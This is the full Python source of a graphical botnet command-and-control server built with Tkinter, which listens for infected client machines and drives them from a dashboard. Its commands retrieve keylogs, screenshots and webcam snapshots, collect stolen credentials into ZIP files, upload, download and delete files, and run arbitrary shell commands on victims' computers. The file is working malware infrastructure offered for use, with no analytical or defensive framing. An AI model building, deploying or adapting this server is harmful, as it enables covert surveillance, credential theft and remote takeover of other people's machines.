"""
Botnet Server
=================
This file implements a graphical botnet command & control server using Python and Tkinter.
It allows you to connect to multiple bots (clients), send them commands (upload, download, screenshot, webcam, etc.), and receive their responses/files.

Key Features:
- GUI built with Tkinter for easy management.
- Handles multiple bots with threading.
- File transfers, shell commands, credential stealing, screenshots, webcam snaps.
"""

import socket
import os
from datetime import datetime
import struct
import threading
import tkinter as tk
from tkinter import filedialog, ttk, messagebox

# Configuration constants
SERVER_IP = "0.0.0.0"        # Listen on all interfaces
SERVER_PORT = 8091           # Port for incoming bots
CHUNK_SIZE = 2048            # Data chunk size for file transfers
EOF_MARKER = "<end_of_file>" # End-of-file marker for file transfer
BASE_DIR = os.path.dirname(os.path.abspath(__file__)) # Directory for file operations

# List of supported commands
COMMANDS = [
    "upload", "download", "get_keylog", "screenshot",
    "webcam_snap", "steal_creds", "delete", "exit"
]

# GUI styling
DARK_BG = "#222b3a"
SIDEBAR_BG = "#1b2230"
MAIN_BG = "#262d3b"
ACCENT = "#3e92cc"
TEXT_COLOR = "#f5f6fa"
BTN_BG = "#42506a"
BTN_ACTIVE_BG = "#3e92cc"
FONT = ("Segoe UI", 11)
FONT_BOLD = ("Segoe UI", 11, "bold")
LOG_BG = "#222b3a"
LOG_FG = "#f5f6fa"
ENTRY_BG = "#31384a"
ENTRY_FG = "#f5f6fa"

# Helper function: Save keylog data to a timestamped file
def save_keylog(data):
    now = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"keylog_{now}.txt"
    save_path = os.path.join(BASE_DIR, filename)
    with open(save_path, "w", encoding="utf-8") as f:
        f.write(data)
    return save_path

# Helper function: Receive command output from the client until end marker
def receive_result(client_socket):
    data = b""
    while True:
        chunk = client_socket.recv(4096)
        if not chunk:
            break
        data += chunk
        if b"<end_of_result>" in data:
            break
    output = data.decode(errors="ignore").replace("<end_of_result>", "").strip()
    return output

# Helper function: Receive webcam image from client
def receive_webcam_image(client_socket, save_as="webcam.jpg"):
    try:
        data = b""
        while len(data) < 8:
            packet = client_socket.recv(8 - len(data))
            if not packet:
                return "[!] Client disconnected."
            data += packet
        img_size = struct.unpack('<Q', data)[0]
        if img_size == 0:
            return "[!] No webcam image received."
        img_data = b""
        while len(img_data) < img_size:
            packet = client_socket.recv(min(CHUNK_SIZE, img_size - len(img_data)))
            if not packet:
                return "[!] Client disconnected."
            img_data += packet
        with open(os.path.join(BASE_DIR, save_as), "wb") as f:
            f.write(img_data)
        return f"[+] Webcam image saved as {save_as}"
    except Exception as e:
        return f"[!] Webcam receive error: {e}"

# Helper function: Receive stolen credentials ZIP from client
def receive_creds_zip(client_socket):
    fname = f"stolen_creds_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
    save_path = os.path.join(BASE_DIR, fname)
    first = client_socket.recv(16)
    if first == b"NO_CREDS":
        return "[!] Client found no credentials."
    if first != b"READY":
        return "[!] Unexpected response from client."
    with open(save_path, "wb") as f:
        while True:
            chunk = client_socket.recv(CHUNK_SIZE)
            if not chunk:
                return "[!] Lost connection during credential steal."
            if chunk.endswith(EOF_MARKER.encode()):
                f.write(chunk[:-len(EOF_MARKER)])
                break
            f.write(chunk)
    return f"[+] Stolen credentials ZIP saved: {save_path}"

# Main GUI class for the server
class BotnetServerGUI:
    def __init__(self, master):
        self.master = master
        master.title("Botnet Control Center")
        master.configure(bg=MAIN_BG)

        # Sidebar for bots/actions/status
        self.sidebar = tk.Frame(master, width=220, bg=SIDEBAR_BG)
        self.sidebar.pack(side="left", fill="y")
        self.sidebar.pack_propagate(False)

        tk.Label(self.sidebar, text="🕷 BOTNET", bg=SIDEBAR_BG, fg=ACCENT, font=("Segoe UI", 16, "bold"), anchor="center").pack(fill="x", pady=(18, 2))

        # List of connected bots
        tk.Label(self.sidebar, text="Connected Bots", bg=SIDEBAR_BG, fg=TEXT_COLOR, font=("Segoe UI", 12, "bold")).pack(fill="x", pady=(10, 0))
        self.bot_listbox = tk.Listbox(self.sidebar, font=FONT, bg=BTN_BG, fg=ACCENT, selectbackground=ACCENT, selectforeground=TEXT_COLOR, relief="flat", height=10, highlightthickness=0)
        self.bot_listbox.pack(fill="x", padx=10, pady=4)
        self.bot_listbox.bind("<<ListboxSelect>>", self.select_bot)
        self.bots = {}  # key: display name, value: (socket, addr, thread)
        self.selected_bot = None

        # Actions: buttons for each command
        tk.Label(self.sidebar, text="Actions", bg=SIDEBAR_BG, fg=TEXT_COLOR, font=("Segoe UI", 12, "bold")).pack(fill="x", pady=(8, 0))
        for cmd in COMMANDS:
            b = tk.Button(self.sidebar,
                          text=cmd.title(), font=FONT,
                          bg=BTN_BG, fg=TEXT_COLOR,
                          activebackground=BTN_ACTIVE_BG, activeforeground="#fff",
                          relief="flat", bd=0, highlightthickness=0,
                          command=lambda c=cmd: self.show_command_form(c))
            b.pack(fill="x", padx=15, pady=2)

        # Status label
        self.status_var = tk.StringVar(value="Server not started.")
        tk.Label(self.sidebar, textvariable=self.status_var, bg=SIDEBAR_BG, fg="#7f8fa6", font=("Segoe UI", 9), anchor="w").pack(side="bottom", fill="x", padx=8, pady=10)

        # Main panel for command forms and logs
        self.main = tk.Frame(master, bg=MAIN_BG)
        self.main.pack(side="right", fill="both", expand=True)

        # Command form panel (changes based on selected action)
        self.form_panel = tk.Frame(self.main, bg=MAIN_BG)
        self.form_panel.pack(fill="x", padx=20, pady=12)
        self.current_command = None

        # Tabs for command logs and shell output
        self.tabs = ttk.Notebook(self.main)
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("TNotebook", background=MAIN_BG, borderwidth=0)
        style.configure("TNotebook.Tab", background=BTN_BG, foreground=TEXT_COLOR, font=FONT_BOLD, padding=10)
        style.map("TNotebook.Tab", background=[("selected", ACCENT)], foreground=[("selected", TEXT_COLOR)])

        # One log tab per command
        self.command_logs = {}
        for cmd in COMMANDS:
            frame = tk.Frame(self.tabs, bg=LOG_BG)
            txt = tk.Text(frame, wrap="word", font=("Consolas", 10), bg=LOG_BG, fg=LOG_FG, bd=0, highlightthickness=0, relief="flat")
            txt.pack(fill="both", expand=True, padx=2, pady=2)
            txt.config(state="disabled")
            self.command_logs[cmd] = txt
            self.tabs.add(frame, text=cmd.title())

        # Shell tab for direct shell command execution
        shell_frame = tk.Frame(self.tabs, bg=LOG_BG)
        self.shell_output = tk.Text(shell_frame, wrap="word", font=("Consolas", 10), bg=LOG_BG, fg=ACCENT, bd=0, highlightthickness=0, relief="flat")
        self.shell_output.pack(fill="both", expand=True, padx=2, pady=(2,0))
        self.shell_output.config(state="disabled")
        shell_input_frame = tk.Frame(shell_frame, bg=LOG_BG)
        shell_input_frame.pack(fill="x", pady=(0, 6))
        self.shell_entry = tk.Entry(shell_input_frame, width=65, font=FONT, bg=ENTRY_BG, fg=ENTRY_FG, insertbackground=ACCENT, bd=0, highlightthickness=0)
        self.shell_entry.pack(side="left", padx=5, pady=5, fill="x", expand=True)
        self.shell_entry.bind("<Return>", lambda event: self.send_shell_command())
        tk.Button(shell_input_frame, text="Send", font=FONT_BOLD, bg=ACCENT, fg="#fff", activebackground=BTN_ACTIVE_BG, bd=0, relief="flat", command=self.send_shell_command).pack(side="left", padx=7, pady=5)
        self.tabs.add(shell_frame, text="Shell")
        self.tabs.pack(fill="both", expand=True, padx=15, pady=8)

        # Networking: server socket (not started yet)
        self.server_socket = None

        # Button to start listening for bots
        self.start_btn = tk.Button(self.sidebar, text="Start Server", bg=ACCENT, fg="#fff", font=FONT_BOLD,
                                   relief="flat", bd=0, highlightthickness=0, activebackground="#2d6ca2",
                                   command=self.start_server)
        self.start_btn.pack(fill="x", padx=15, pady=(15, 8))

        # Disable controls until bot is selected
        self.disable_controls()

    # When a bot is selected in the list
    def select_bot(self, event=None):
        selected = self.bot_listbox.curselection()
        if selected:
            botname = self.bot_listbox.get(selected[0])
            self.selected_bot = botname
            self.enable_controls()
            self.set_status(f"Selected: {botname}")
        else:
            self.selected_bot = None
            self.disable_controls()
            self.set_status("No bot selected.")

    # Disable command controls (no bot selected)
    def disable_controls(self):
        for widget in self.form_panel.winfo_children():
            if hasattr(widget, 'config'):
                try:
                    widget.config(state="disabled")
                except tk.TclError:
                    pass
        self.shell_entry.config(state="disabled")

    # Enable command controls (bot selected)
    def enable_controls(self):
        for widget in self.form_panel.winfo_children():
            if hasattr(widget, 'config'):
                try:
                    widget.config(state="normal")
                except tk.TclError:
                    pass
        self.shell_entry.config(state="normal")

    # Show command-specific form in the main panel
    def show_command_form(self, cmd):
        for widget in self.form_panel.winfo_children():
            widget.destroy()
        self.current_command = cmd
        if cmd == "upload":
            tk.Label(self.form_panel, text="Choose file to upload:", bg=MAIN_BG, fg=ACCENT, font=FONT_BOLD).pack(side="left")
            tk.Button(self.form_panel, text="Browse", font=FONT, bg=BTN_BG, fg=TEXT_COLOR, activebackground=ACCENT, relief="flat", command=self.upload_file).pack(side="left", padx=8)
        elif cmd == "download":
            tk.Label(self.form_panel, text="Filename to download:", bg=MAIN_BG, fg=ACCENT, font=FONT_BOLD).pack(side="left")
            self.download_entry = tk.Entry(self.form_panel, width=28, font=FONT, bg=ENTRY_BG, fg=ENTRY_FG, insertbackground=ACCENT, bd=0)
            self.download_entry.pack(side="left", padx=8)
            tk.Button(self.form_panel, text="Download", font=FONT, bg=BTN_BG, fg=TEXT_COLOR, activebackground=ACCENT, relief="flat", command=self.download_file).pack(side="left")
        elif cmd == "delete":
            tk.Label(self.form_panel, text="Path to delete:", bg=MAIN_BG, fg=ACCENT, font=FONT_BOLD).pack(side="left")
            self.delete_entry = tk.Entry(self.form_panel, width=28, font=FONT, bg=ENTRY_BG, fg=ENTRY_FG, insertbackground=ACCENT, bd=0)
            self.delete_entry.pack(side="left", padx=8)
            tk.Button(self.form_panel, text="Delete", font=FONT, bg=BTN_BG, fg=TEXT_COLOR, activebackground=ACCENT, relief="flat", command=self.delete_path).pack(side="left")
        elif cmd in ("get_keylog", "screenshot", "webcam_snap", "steal_creds"):
            tk.Button(self.form_panel, text=f"Run {cmd.title().replace('_', ' ')}", font=FONT_BOLD, bg=ACCENT, fg="#fff", activebackground=BTN_ACTIVE_BG, relief="flat", command=lambda: self.run_simple_command(cmd)).pack(side="left")
        elif cmd == "exit":
            tk.Button(self.form_panel, text="Disconnect", font=FONT_BOLD, bg="#e84118", fg="#fff", activebackground="#c23616", relief="flat", command=self.disconnect).pack(side="left")

    # Log output for a specific command tab
    def log_command(self, cmd, msg):
        def _log():
            txt = self.command_logs[cmd]
            txt.config(state="normal")
            txt.insert("end", msg + "\n")
            txt.see("end")
            txt.config(state="disabled")
        self.master.after(0, _log)

    # Set the status label text
    def set_status(self, msg):
        self.status_var.set(msg)

    # Start the server socket and begin listening for bots
    def start_server(self):
        self.start_btn.config(state="disabled")
        threading.Thread(target=self.run_server, daemon=True).start()

    # Server loop: accept incoming bots and spawn threads for each
    def run_server(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((SERVER_IP, SERVER_PORT))
            self.server_socket.listen(50)
            self.set_status(f"Listening on {SERVER_IP}:{SERVER_PORT}")
            while True:
                client_socket, addr = self.server_socket.accept()
                bot_display = f"{addr[0]}:{addr[1]}_{datetime.now().strftime('%H%M%S')}"
                self.bots[bot_display] = (client_socket, addr, threading.Thread(target=self.handle_bot, args=(bot_display, client_socket), daemon=True))
                self.master.after(0, lambda name=bot_display: self.bot_listbox.insert("end", name))
                self.bots[bot_display][2].start()
        except Exception as e:
            self.set_status("Server error.")
            self.log_command("exit", f"[!] Server error: {e}")

    # Thread for each bot: monitors connection, cleans up on disconnect
    def handle_bot(self, bot_display, client_socket):
        try:
            while True:
                data = client_socket.recv(1)
                if not data:
                    break
        except Exception:
            pass
        finally:
            self.master.after(0, lambda: self.remove_bot(bot_display))

    # Remove bot from internal list and GUI
    def remove_bot(self, bot_display):
        if bot_display in self.bots:
            sock, addr, thread = self.bots.pop(bot_display)
            try:
                sock.close()
            except Exception:
                pass
            for i in range(self.bot_listbox.size()):
                if self.bot_listbox.get(i) == bot_display:
                    self.bot_listbox.delete(i)
                    break
            self.set_status(f"Bot {bot_display} disconnected.")
            self.selected_bot = None

    # Helper: get the socket of the selected bot
    def get_selected_socket(self):
        if not self.selected_bot or self.selected_bot not in self.bots:
            messagebox.showerror("No Bot Selected", "Please select a bot first.")
            return None
        return self.bots[self.selected_bot][0]

    # Decorator to ensure a bot is selected before running a command
    def require_bot(func):
        def wrapper(self, *args, **kwargs):
            if not self.selected_bot or self.selected_bot not in self.bots:
                messagebox.showerror("No Bot Selected", "Please select a bot first.")
                return
            return func(self, *args, **kwargs)
        return wrapper

    # Upload file to client
    @require_bot
    def upload_file(self):
        file_path = filedialog.askopenfilename()
        if not file_path:
            return
        filename = os.path.basename(file_path)
        self.log_command("upload", f"Uploading {filename} to {self.selected_bot} ...")
        threading.Thread(target=self.upload_file_thread, args=(file_path, filename), daemon=True).start()

    def upload_file_thread(self, file_path, filename):
        try:
            client_socket = self.get_selected_socket()
            if not client_socket: return
            client_socket.sendall(f"upload {filename}".encode())
            ack = client_socket.recv(1024).decode(errors="ignore")
            if ack == "READY":
                with open(file_path, "rb") as f:
                    while True:
                        chunk = f.read(CHUNK_SIZE)
                        if not chunk:
                            break
                        client_socket.sendall(chunk)
                client_socket.sendall(EOF_MARKER.encode())
                status = client_socket.recv(1024).decode(errors="ignore")
                self.log_command("upload", f"[+] {status.strip()}")
            else:
                self.log_command("upload", "[!] Client not ready for upload.")
        except Exception as e:
            self.log_command("upload", f"[!] Upload error: {e}")

    # Download file from client
    @require_bot
    def download_file(self):
        filename = self.download_entry.get().strip()
        if not filename:
            return
        self.log_command("download", f"Requesting download: {filename} from {self.selected_bot}")
        threading.Thread(target=self.download_file_thread, args=(filename,), daemon=True).start()

    def download_file_thread(self, filename):
        try:
            client_socket = self.get_selected_socket()
            if not client_socket: return
            client_socket.sendall(f"download {filename}".encode())
            client_socket.settimeout(5)
            try:
                exists = client_socket.recv(1024).decode(errors="ignore")
            except socket.timeout:
                self.log_command("download", "[!] Timeout waiting for file existence response.")
                return
            client_socket.settimeout(None)
            if exists == "READY":
                save_path = os.path.join(BASE_DIR, os.path.basename(filename))
                with open(save_path, "wb") as f:
                    while True:
                        chunk = client_socket.recv(CHUNK_SIZE)
                        if not chunk:
                            self.log_command("download", "[!] Connection lost during download.")
                            break
                        if chunk.endswith(EOF_MARKER.encode()):
                            f.write(chunk[:-len(EOF_MARKER)])
                            break
                        f.write(chunk)
                self.log_command("download", f"[+] File received: {save_path}")
            elif exists == "NOFILE":
                self.log_command("download", "[!] Client reports file not found.")
            else:
                self.log_command("download", f"[!] Unexpected client response: {exists}")
        except Exception as e:
            self.log_command("download", f"[!] Error: {e}")

    # Delete file/directory on client
    @require_bot
    def delete_path(self):
        path = self.delete_entry.get().strip()
        if not path:
            return
        self.log_command("delete", f"Deleting {path} on {self.selected_bot}")
        threading.Thread(target=self.delete_path_thread, args=(path,), daemon=True).start()

    def delete_path_thread(self, path):
        try:
            client_socket = self.get_selected_socket()
            if not client_socket: return
            cmd = f"delete {path}"
            client_socket.sendall(cmd.encode())
            result = receive_result(client_socket)
            self.log_command("delete", result)
        except Exception as e:
            self.log_command("delete", f"[!] Error: {e}")

    # Run simple commands (keylog, screenshot, etc.) on client
    @require_bot
    def run_simple_command(self, cmd):
        self.log_command(cmd, f"Running {cmd} on {self.selected_bot}...")
        threading.Thread(target=self.run_simple_command_thread, args=(cmd,), daemon=True).start()

    def run_simple_command_thread(self, cmd):
        try:
            client_socket = self.get_selected_socket()
            if not client_socket: return
            if cmd == "get_keylog":
                client_socket.sendall(cmd.encode())
                data = b""
                while True:
                    chunk = client_socket.recv(CHUNK_SIZE)
                    if not chunk:
                        break
                    data += chunk
                    if EOF_MARKER.encode() in data:
                        data = data.replace(EOF_MARKER.encode(), b"")
                        break
                if data == b"NO_KEYLOG":
                    self.log_command(cmd, "[!] Client reported no keylog file.")
                else:
                    save_path = save_keylog(data.decode(errors="ignore"))
                    self.log_command(cmd, f"[+] Keylog saved to {save_path}")
            elif cmd == "screenshot":
                client_socket.sendall(cmd.encode())
                filename = client_socket.recv(1024).decode(errors="ignore")
                exists = client_socket.recv(1024).decode(errors="ignore")
                if exists == "yes":
                    client_socket.sendall("ready".encode())
                    save_path = os.path.join(BASE_DIR, f"received_{filename}")
                    with open(save_path, "wb") as f:
                        while True:
                            chunk = client_socket.recv(CHUNK_SIZE)
                            if not chunk:
                                self.log_command(cmd, "[!] Connection lost during screenshot transfer.")
                                break
                            if chunk.endswith(EOF_MARKER.encode()):
                                f.write(chunk[:-len(EOF_MARKER)])
                                break
                            f.write(chunk)
                    self.log_command(cmd, f"[+] Screenshot received: {save_path}")
                else:
                    self.log_command(cmd, "[!] Screenshot failed or not found on client.")
            elif cmd == "webcam_snap":
                client_socket.sendall(cmd.encode())
                result = receive_webcam_image(client_socket, save_as="webcam.jpg")
                self.log_command(cmd, result)
            elif cmd == "steal_creds":
                client_socket.sendall(cmd.encode())
                result = receive_creds_zip(client_socket)
                self.log_command(cmd, result)
        except Exception as e:
            self.log_command(cmd, f"[!] Error: {e}")

    # Log output for shell tab
    def log_shell(self, msg):
        def _log():
            self.shell_output.config(state="normal")
            self.shell_output.insert("end", msg + "\n")
            self.shell_output.see("end")
            self.shell_output.config(state="disabled")
        self.master.after(0, _log)

    # Send shell command to client
    def send_shell_command(self):
        cmd = self.shell_entry.get().strip()
        if not cmd or not self.selected_bot or self.selected_bot not in self.bots:
            return
        self.log_shell(f">>> {cmd}")
        self.shell_entry.delete(0, 'end')
        threading.Thread(target=self.handle_shell_command, args=(cmd,), daemon=True).start()

    def handle_shell_command(self, cmd):
        try:
            client_socket = self.get_selected_socket()
            if not client_socket: return
            client_socket.sendall(cmd.encode())
            result = b""
            while True:
                chunk = client_socket.recv(4096)
                if not chunk:
                    break
                result += chunk
                if b"<end_of_result>" in result:
                    break
            output = result.decode(errors="ignore").replace("<end_of_result>", "").strip()
            self.log_shell(output)
        except Exception as e:
            self.log_shell(f"[!] Error: {e}")

    # Disconnect from bot
    @require_bot
    def disconnect(self):
        try:
            client_socket = self.get_selected_socket()
            if not client_socket: return
            client_socket.sendall(b"exit")
            client_socket.close()
            self.remove_bot(self.selected_bot)
        except Exception as e:
            self.log_command("exit", f"[!] Error: {e}")

# Main entry point: start GUI
if __name__ == "__main__":
    root = tk.Tk()
    root.geometry("1150x700")
    root.configure(bg=MAIN_BG)
    app = BotnetServerGUI(root)
    root.mainloop()